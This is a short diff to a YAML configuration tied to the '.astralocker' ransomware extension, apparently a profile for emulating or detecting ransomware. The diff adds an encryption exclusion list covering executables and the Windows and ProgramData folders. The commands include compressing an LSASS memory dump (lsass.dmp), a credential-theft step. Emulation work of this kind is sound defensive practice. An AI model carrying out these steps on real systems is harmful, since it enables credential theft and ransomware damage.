@@ -1,4 +1,11 @@
 file_extension: .astralocker
+exclude:
+  - .exe
+  - .dll
+  - .lnk
+  - .sys
+  - %SYSTEMDRIVE%\Windows
+  - %SYSTEMDRIVE%\ProgramData
 command:
   - C:\Windows\SysWow64\NOTEPAD.EXE C:\Windows\locker_64.dll.log
   - makecab  lsass.dmp lsass.dmp.cab
